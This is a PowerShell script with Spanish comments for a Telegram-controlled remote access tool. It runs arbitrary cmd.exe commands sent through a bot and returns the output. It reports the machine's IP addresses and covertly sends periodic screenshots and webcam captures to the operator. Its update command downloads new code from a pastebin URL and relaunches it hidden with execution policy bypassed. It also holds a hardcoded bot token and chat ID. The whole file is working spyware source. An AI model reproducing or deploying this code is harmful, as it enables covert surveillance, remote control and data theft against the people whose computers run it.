# === CONFIGURACIÓN dasdas ===
$botToken = "7715140029:AAEX9sYUmAcB9qmnzNMy9cKzVVBqMMnRoDY"
$chatId = "6840216425"
$apiUrl = "https://api.telegram.org/bot$botToken"
$lastIdFile = "$PSScriptRoot\last_update_id.txt"
$lastCmdDirFile = "$PSScriptRoot\last_cmd_dir.txt"

# === VARIABLES GLOBALES ===
$scEnabled = $false
$scInterval = 30
$lastScTime = Get-Date
$noCamSent = $false

Add-Type -AssemblyName System.Net.Http

function Enviar-Foto {
    param ([string]$filePath)
    if (Test-Path $filePath) {
        $url = "$apiUrl/sendPhoto"
        $fileStream = [System.IO.File]::OpenRead($filePath)
        $fileName = [System.IO.Path]::GetFileName($filePath)
        $form = New-Object System.Net.Http.MultipartFormDataContent
        $form.Add((New-Object System.Net.Http.StringContent($chatId)), 'chat_id')
        $form.Add((New-Object System.Net.Http.StreamContent($fileStream)), 'photo', $fileName)
        $client = New-Object System.Net.Http.HttpClient
        $response = $client.PostAsync($url, $form).Result
        $fileStream.Close()
        Remove-Item $filePath -Force
    }
}

# === CARGAR ÚLTIMO update_id ===
$lastUpdateId = 0
if (Test-Path $lastIdFile) {
    $lastUpdateId = Get-Content $lastIdFile
}

# === Notificar que el bot está activo ===
Invoke-RestMethod -Uri "$apiUrl/sendMessage" -Method Post -Body @{
    chat_id = $chatId
    text    = "BOT INICIADO correctamente."
}

while ($true) {
    try {
        $url = "$apiUrl/getUpdates?offset=$($lastUpdateId + 1)&timeout=5"
        $response = Invoke-RestMethod -Uri $url -Method Get

        foreach ($update in $response.result) {
            $updateId = $update.update_id
            $msg = $update.message.text
            $chatId = $update.message.chat.id
            $from = $update.message.from.first_name
            $cleanMsg = $msg.ToLower()
            $reply = ""

            switch -Wildcard ($cleanMsg) {
                "/start"   { $reply = "Hola $from, soy tu bot." }
                "/hora"    { $reply = "La hora es: $(Get-Date -Format 'HH:mm:ss')" }
                "/status"  { $reply = "Sistema encendido y operativo." }
                "/menu" {
                    $reply = @"
/start       - Iniciar bot
/hora        - Ver hora actual
/status      - Estado del sistema
/ip          - Dirección IP y red
/sc on       - Activar vigilancia
/sc off      - Desactivar vigilancia
/settime X   - Cambiar intervalo
/cmd comando - Ejecutar CMD
/update      - Actualizar bot
"@
                }
                "/ip" {
                    try {
                        $ipLines = ipconfig | Where-Object { $_.Trim() -ne "" }
                        $formattedLocal = ""
                        $inSection = $false
                        foreach ($line in $ipLines) {
                            if ($line -match "Adaptador|adapter|Configuration|Configuracion") {
                                $formattedLocal += "`n" + $line.Trim() + "`n"
                                $inSection = $true
                            } elseif ($inSection) {
                                $formattedLocal += "  " + $line.Trim() + "`n"
                            } else {
                                $formattedLocal += $line.Trim() + "`n"
                            }
                        }
                        $publicIp = (Invoke-RestMethod -Uri "https://api.ipify.org?format=text").Trim()
                        $reply = "--- IP DETECTADA ---`nPública: $publicIp`n--- IPs Locales ---`n$formattedLocal"
                    } catch {
                        $reply = "Error al obtener IP: $_"
                    }
                }
                "/sc on" {
                    $scEnabled = $true
                    $noCamSent = $false
                    $lastScTime = Get-Date
                    $reply = "SC Activado. Captura cada $scInterval segundos."
                }
                "/sc off" {
                    $scEnabled = $false
                    $reply = "SC Desactivado."
                }
                { $_ -like "/settime *" } {
                    $t = $cleanMsg.Split(" ")[1]
                    if ($t -match '^\d+$') {
                        $scInterval = [int]$t
                        $reply = "Intervalo actualizado a $scInterval segundos."
                    } else {
                        $reply = "Uso: /settime X (ej: /settime 10)"
                    }
                }
                { $_ -like "/cmd *" } {
                    $comando = $msg.Substring(5)
                    if ($comando) {
                        try {
                            $salida = cmd.exe /c $comando 2>&1 | Out-String
                            $reply = "Resultado:`n$salida"
                            Set-Content $lastCmdDirFile -Value (Get-Location)
                        } catch {
                            $reply = "Error al ejecutar el comando: $_"
                        }
                    } else {
                        $reply = "Uso correcto: /cmd <comando>"
                    }
                }
"/update" {
    $ps1Path = $MyInvocation.MyCommand.Path
    $backupPath = "$ps1Path.bak"
    $url = "https://pastebin.com/raw/w0cQkpZH"

    try {
        # Usar WebClient con encabezado User-Agent
        $wc = New-Object System.Net.WebClient
        $wc.Headers.Add("user-agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64)")
        $nuevoTexto = $wc.DownloadString($url).Trim()

        $actualTexto = Get-Content -Path $ps1Path -Raw

        if ($nuevoTexto -eq $actualTexto) {
            $reply = "Ya estás usando la última versión."
        } else {
            Copy-Item -Path $ps1Path -Destination $backupPath -Force
            Set-Content -Path $ps1Path -Value $nuevoTexto -Force
            Start-Sleep -Seconds 1
            Start-Process -WindowStyle Hidden -FilePath "powershell.exe" -ArgumentList "-ExecutionPolicy Bypass -WindowStyle Hidden -File `"$ps1Path`""
            exit
        }
    } catch {
        if (Test-Path $backupPath) {
            Copy-Item -Path $backupPath -Destination $ps1Path -Force
            $reply = "Fallo en la actualización. Se restauró la versión anterior."
        } else {
            $reply = "Error durante la actualización: $_"
        }
    }
}

                default {
                    $reply = "Recibido: $cleanMsg"
                }
            }

            if ($reply) {
                Invoke-RestMethod -Uri "$apiUrl/sendMessage" -Method Post -Body @{
                    chat_id = $chatId
                    text    = $reply
                }
            }

            $lastUpdateId = $updateId
            Set-Content -Path $lastIdFile -Value $lastUpdateId
        }

        # === Captura automática SC ===
        if ($scEnabled -and ((Get-Date) - $lastScTime).TotalSeconds -ge $scInterval) {
            $timestamp = Get-Date -Format "yyyyMMdd_HHmmss"
            $screenFile = "$PSScriptRoot\screen_$timestamp.jpg"
            $cameraFile = "$PSScriptRoot\camera_$timestamp.jpg"

            try {
                Add-Type -AssemblyName System.Windows.Forms
                Add-Type -AssemblyName System.Drawing
                $bounds = [System.Windows.Forms.Screen]::PrimaryScreen.Bounds
                $bmp = New-Object System.Drawing.Bitmap $bounds.Width, $bounds.Height
                $graphics = [System.Drawing.Graphics]::FromImage($bmp)
                $graphics.CopyFromScreen($bounds.Location, [System.Drawing.Point]::Empty, $bounds.Size)
                $bmp.Save($screenFile, [System.Drawing.Imaging.ImageFormat]::Jpeg)
                $graphics.Dispose()
                $bmp.Dispose()
            } catch {
                $screenFile = $null
            }

            $camAvailable = $false
            $ffmpegPath = "C:\ffmpeg\bin\ffmpeg.exe"
            if (Test-Path $ffmpegPath) {
                $camArgs = '-f dshow -i video="Integrated Camera" -frames:v 1 "' + $cameraFile + '" -y'
                Start-Process -WindowStyle Hidden -FilePath $ffmpegPath -ArgumentList $camArgs -NoNewWindow -Wait
                if (Test-Path $cameraFile) { $camAvailable = $true }
            }

            if ($screenFile) { Enviar-Foto -filePath $screenFile }
            if ($camAvailable) {
                Enviar-Foto -filePath $cameraFile
            } elseif (-not $noCamSent) {
                Invoke-RestMethod -Uri "$apiUrl/sendMessage" -Method Post -Body @{
                    chat_id = $chatId
                    text    = "No se detectó cámara disponible."
                }
                $noCamSent = $true
            }

            $lastScTime = Get-Date
        }
    } catch {
        Write-Host "Error general: $_"
    }

    Start-Sleep -Seconds 1
}
